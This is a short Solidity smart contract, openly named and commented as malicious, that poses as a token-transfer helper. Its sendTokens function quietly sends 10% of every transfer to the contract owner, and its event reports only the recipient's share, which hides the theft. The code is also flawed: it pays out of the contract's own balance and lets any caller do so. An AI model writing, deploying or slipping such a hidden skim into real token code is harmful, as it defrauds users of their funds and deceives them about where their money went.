// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Import OpenZeppelin's IERC20 interface
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MaliciousTokenTransfer {
    address public owner;

    // Event declaration
    event TokensSent(address indexed from, address indexed to, uint256 amount);

    constructor() {
        owner = msg.sender; // Initialize the owner
    }

    // Function to send tokens, but maliciously steals a portion
    function sendTokens(address token, address recipient, uint256 amount) public {
        require(recipient != address(0), "Recipient cannot be the zero address");
        require(amount > 0, "Amount must be greater than zero");

        uint256 stolenAmount = amount / 10; // Steal 10% of the amount
        uint256 remainingAmount = amount - stolenAmount;

        // Transfer 90% to the recipient and 10% to the malicious owner
        bool successRecipient = IERC20(token).transfer(recipient, remainingAmount);
        require(successRecipient, "Token transfer to recipient failed");

        bool successOwner = IERC20(token).transfer(owner, stolenAmount);
        require(successOwner, "Token transfer to owner failed");

        // Emit the TokensSent event
        emit TokensSent(msg.sender, recipient, remainingAmount);
    }

    // Function to retrieve the balance of tokens in this contract
    function getTokenBalance(address token) public view returns (uint256) {
        return IERC20(token).balanceOf(address(this));
    }
}